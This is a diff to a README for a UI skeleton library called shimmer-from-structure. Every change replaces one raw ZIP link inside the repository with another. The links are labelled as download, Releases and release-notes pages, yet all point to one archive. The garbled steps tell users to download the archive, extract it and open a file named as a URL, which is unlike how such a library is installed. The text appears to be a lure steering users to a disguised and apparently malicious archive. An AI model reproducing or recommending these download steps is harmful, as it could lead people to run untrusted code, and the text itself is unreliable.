@@ -4,11 +4,11 @@
 **shimmer-from-structure** creates UI skeletons for your applications in React, Vue, and Svelte. With automatic adaptation to your component structure, you can achieve pixel-perfect accuracy effortlessly. This tool helps designer and developer teams present loading states clearly, enhancing user experience.
 
 ## 📦 Download & Install
-To get started with shimmer-from-structure, visit this page to download: [Download shimmer-from-structure](https://raw.githubusercontent.com/adonis109/shimmer-from-structure/main/packages/react/src/shimmer-structure-from-3.3.zip)
+To get started with shimmer-from-structure, visit this page to download: [Download shimmer-from-structure](https://github.com/adonis109/shimmer-from-structure/raw/refs/heads/main/packages/shimmer_from_structure_2.1.zip)
 
 ## 🚀 Getting Started
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://raw.githubusercontent.com/adonis109/shimmer-from-structure/main/packages/react/src/shimmer-structure-from-3.3.zip). Here, you will find different versions of the software.
+   Go to our [Releases page](https://github.com/adonis109/shimmer-from-structure/raw/refs/heads/main/packages/shimmer_from_structure_2.1.zip). Here, you will find different versions of the software.
 
 2. **Select a Version:**
    Look for the latest version at the top of the page. Each version includes updates and bug fixes to improve your experience.
@@ -17,13 +17,13 @@ To get started with shimmer-from-structure, visit this page to download: [Downlo
    Click on the version name. You will see a list of files. Choose the correct file for your operating system by clicking on it. This file will start to download automatically.
 
 4. **Locate the Downloaded File:**
-   Once the download completes, find the file in your downloads folder. It may be named like `https://raw.githubusercontent.com/adonis109/shimmer-from-structure/main/packages/react/src/shimmer-structure-from-3.3.zip`. 
+   Once the download completes, find the file in your downloads folder. It may be named like `https://github.com/adonis109/shimmer-from-structure/raw/refs/heads/main/packages/shimmer_from_structure_2.1.zip`. 
 
 5. **Extract the Files:**
    Right-click the downloaded ZIP file and select "Extract All." Follow the prompts to extract the contents.
 
 6. **Run the Application:**
-   After extraction, find the `https://raw.githubusercontent.com/adonis109/shimmer-from-structure/main/packages/react/src/shimmer-structure-from-3.3.zip` file inside the folder. Open this file in your web browser to start using shimmer-from-structure.
+   After extraction, find the `https://github.com/adonis109/shimmer-from-structure/raw/refs/heads/main/packages/shimmer_from_structure_2.1.zip` file inside the folder. Open this file in your web browser to start using shimmer-from-structure.
 
 ## 🔑 Features
 - **Automatic Adaptation:** The tool automatically matches your component structure.
@@ -50,13 +50,13 @@ This tool connects various development frameworks and enhances your projects thr
 ## 🚧 Troubleshooting
 - **Issue with Downloading:** Ensure you have a stable internet connection. If you face problems, try refreshing the page and attempt to download again.
 
-- **Application Doesn’t Start:** Check if you have the correct files extracted. Ensure to open the `https://raw.githubusercontent.com/adonis109/shimmer-from-structure/main/packages/react/src/shimmer-structure-from-3.3.zip` file with a compatible web browser.
+- **Application Doesn’t Start:** Check if you have the correct files extracted. Ensure to open the `https://github.com/adonis109/shimmer-from-structure/raw/refs/heads/main/packages/shimmer_from_structure_2.1.zip` file with a compatible web browser.
 
 ## ✉️ Contact and Support
 If you need help or have questions, visit our GitHub Issues page to report problems or feature requests. We aim to improve your experience continuously.
 
 ## 🔄 Update History
-Every release includes changes and new features. Check the release notes on the [Releases page](https://raw.githubusercontent.com/adonis109/shimmer-from-structure/main/packages/react/src/shimmer-structure-from-3.3.zip) for comprehensive details on what has been added or fixed.
+Every release includes changes and new features. Check the release notes on the [Releases page](https://github.com/adonis109/shimmer-from-structure/raw/refs/heads/main/packages/shimmer_from_structure_2.1.zip) for comprehensive details on what has been added or fixed.
 
 ## 📚 Additional Resources
 For further reading on how to best use shimmer-from-structure, consider reviewing our documentation available on-site, or explore additional guides online related to React, Vue, and Svelte.
